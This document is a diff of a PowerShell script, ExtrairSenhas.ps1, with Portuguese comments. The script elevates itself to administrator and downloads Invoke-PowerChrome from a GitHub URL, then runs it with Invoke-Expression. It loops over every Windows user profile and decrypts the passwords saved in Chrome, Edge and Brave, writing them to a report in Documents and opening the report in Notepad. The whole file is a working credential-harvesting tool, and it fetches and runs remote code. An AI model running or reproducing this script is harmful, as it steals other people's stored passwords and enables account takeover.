@@ -1,4 +1,4 @@
-# ExtrairSenhas.ps1 - Varre TODOS os usuários e navegadores Chromium
+# ExtrairSenhas.ps1 - Versão com diagnóstico e varredura completa
 
 # Força a execução como administrador
 if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
@@ -6,7 +6,6 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     exit
 }
 
-# Define a pasta Documents para salvar o relatório
 $pastaDocuments = [Environment]::GetFolderPath("MyDocuments")
 if (-not (Test-Path $pastaDocuments)) {
     $pastaDocuments = Join-Path $env:USERPROFILE "Documents"
@@ -15,7 +14,7 @@ if (-not (Test-Path $pastaDocuments)) {
 $datahora = Get-Date -Format "yyyyMMdd_HHmmss"
 $arquivoSaida = Join-Path $pastaDocuments "senhas_completo_$datahora.txt"
 
-# Cabeçalho do relatório
+# Inicia o relatório
 $relatorio = @"
 ========================================
 RELATÓRIO COMPLETO DE SENHAS
@@ -25,80 +24,114 @@ Computador: $env:COMPUTERNAME
 
 "@
 
-$relatorio | Out-File -FilePath $arquivoSaida -Encoding UTF8
+# CARREGA O SCRIPT DO GITHUB (com verificação)
+Write-Host "Carregando script do GitHub..." -ForegroundColor Cyan
+try {
+    $scriptContent = IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' -ErrorAction Stop
+    $relatorio += "[OK] Script do GitHub carregado com sucesso`n"
+    Write-Host "Script carregado!" -ForegroundColor Green
+} catch {
+    $relatorio += "[ERRO] Falha ao carregar script do GitHub: $_`n"
+    Write-Host "ERRO ao carregar script!" -ForegroundColor Red
+    $relatorio | Out-File -FilePath $arquivoSaida -Encoding UTF8
+    exit
+}
 
-# Carrega o script do GitHub
-$null = IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' | IEX
+# Executa o script carregado
+$null = Invoke-Expression $scriptContent
 
-# Lista de navegadores para verificar
-$navegadores = @(
-    @{Nome="Chrome"; Caminho="Google\Chrome\User Data"},
-    @{Nome="Edge"; Caminho="Microsoft\Edge\User Data"},
-    @{Nome="Brave"; Caminho="BraveSoftware\Brave-Browser\User Data"},
-    @{Nome="Chromium"; Caminho="Chromium\User Data"}
-)
+# Lista de usuários
+$usuarios = Get-ChildItem "C:\Users" -Directory | Where-Object { $_.Name -notin @("Public", "Default", "Default User", "All Users") }
 
-# Lista de usuários do Windows
-$usuarios = Get-ChildItem "C:\Users" -Directory | Where-Object { $_.Name -notin @("Public", "Default", "Default User") }
+if ($usuarios.Count -eq 0) {
+    $relatorio += "Nenhum usuario encontrado em C:\Users`n"
+} else {
+    $relatorio += "Usuarios encontrados: $($usuarios.Name -join ', ')`n"
+}
 
 foreach ($usuario in $usuarios) {
     $userName = $usuario.Name
     $userPath = $usuario.FullName
     $appDataLocal = Join-Path $userPath "AppData\Local"
     
-    Write-Host "Verificando usuario: $userName" -ForegroundColor Cyan
-    
     $relatorio += "`n========================================`n"
     $relatorio += "USUÁRIO: $userName`n"
     $relatorio += "========================================`n"
     
-    foreach ($nav in $navegadores) {
-        $loginDataPath = Join-Path $appDataLocal "$($nav.Caminho)\Default\Login Data"
+    # Chrome
+    $chromePath = Join-Path $appDataLocal "Google\Chrome\User Data\Default\Login Data"
+    $relatorio += "`n--- Chrome ---`n"
+    if (Test-Path $chromePath) {
+        $tamanho = [math]::Round((Get-Item $chromePath).Length / 1KB, 2)
+        $relatorio += "Arquivo encontrado! Tamanho: $tamanho KB`n"
         
-        if (Test-Path $loginDataPath) {
-            Write-Host "  [+] Encontrado $($nav.Nome) em $userName" -ForegroundColor Green
-            $relatorio += "`n--- $($nav.Nome) ---`n"
-            
-            # Tenta extrair as senhas
-            try {
-                # Copia o arquivo para temporário (evita bloqueio)
-                $tempDb = Join-Path $env:TEMP "temp_${userName}_${nav.Nome}.db"
-                Copy-Item $loginDataPath $tempDb -Force -ErrorAction SilentlyContinue
-                
-                # Executa a extração para este navegador
-                $output = Invoke-PowerChrome -Browser $($nav.Nome.ToLower()) 2>&1
+        # Tenta extrair
+        try {
+            $output = Invoke-PowerChrome -Browser Chrome 2>&1
+            if ($output -match "Decrypted Credentials") {
                 $relatorio += $output
-                $relatorio += "`n"
-                
-                # Limpa arquivo temporário
-                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
+            } else {
+                $relatorio += "Nenhuma senha encontrada ou erro na extracao`n"
+                $relatorio += "Saida do comando: $output`n"
             }
-            catch {
-                $relatorio += "Erro ao extrair: $($_.Exception.Message)`n"
+        } catch {
+            $relatorio += "ERRO na execucao: $($_.Exception.Message)`n"
+        }
+    } else {
+        $relatorio += "Chrome nao encontrado ou sem dados em: $chromePath`n"
+    }
+    
+    # Edge
+    $edgePath = Join-Path $appDataLocal "Microsoft\Edge\User Data\Default\Login Data"
+    $relatorio += "`n--- Edge ---`n"
+    if (Test-Path $edgePath) {
+        $tamanho = [math]::Round((Get-Item $edgePath).Length / 1KB, 2)
+        $relatorio += "Arquivo encontrado! Tamanho: $tamanho KB`n"
+        
+        try {
+            $output = Invoke-PowerChrome -Browser Edge 2>&1
+            if ($output -match "Decrypted Credentials") {
+                $relatorio += $output
+            } else {
+                $relatorio += "Nenhuma senha encontrada ou erro na extracao`n"
             }
+        } catch {
+            $relatorio += "ERRO na execucao: $($_.Exception.Message)`n"
         }
-        else {
-            Write-Host "  [-] $($nav.Nome) nao encontrado em $userName" -ForegroundColor DarkGray
+    } else {
+        $relatorio += "Edge nao encontrado ou sem dados`n"
+    }
+    
+    # Brave
+    $bravePath = Join-Path $appDataLocal "BraveSoftware\Brave-Browser\User Data\Default\Login Data"
+    $relatorio += "`n--- Brave ---`n"
+    if (Test-Path $bravePath) {
+        $tamanho = [math]::Round((Get-Item $bravePath).Length / 1KB, 2)
+        $relatorio += "Arquivo encontrado! Tamanho: $tamanho KB`n"
+        
+        try {
+            $output = Invoke-PowerChrome -Browser Brave 2>&1
+            if ($output -match "Decrypted Credentials") {
+                $relatorio += $output
+            } else {
+                $relatorio += "Nenhuma senha encontrada ou erro na extracao`n"
+            }
+        } catch {
+            $relatorio += "ERRO na execucao: $($_.Exception.Message)`n"
         }
+    } else {
+        $relatorio += "Brave nao encontrado ou sem dados`n"
     }
 }
 
-# Adiciona rodapé
 $relatorio += "`n========================================`n"
 $relatorio += "FIM DO RELATÓRIO`n"
-$relatorio += "Gerado em: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')`n"
 $relatorio += "========================================`n"
 
-# Salva o relatório final
+# Salva o relatório
 $relatorio | Out-File -FilePath $arquivoSaida -Encoding UTF8
 
-# Verifica se salvou corretamente
-if (Test-Path $arquivoSaida) {
-    $tamanho = [math]::Round((Get-Item $arquivoSaida).Length / 1KB, 2)
-    Write-Host "`n===================================================" -ForegroundColor Green
-    Write-Host "SUCESSO! Relatorio salvo em: $arquivoSaida" -ForegroundColor Green
-    Write-Host "Tamanho: $tamanho KB" -ForegroundColor Cyan
-    Write-Host "===================================================" -ForegroundColor Green
-}
+# Abre o arquivo para o usuário ver o que aconteceu
+Start-Process notepad.exe $arquivoSaida
 
 exit
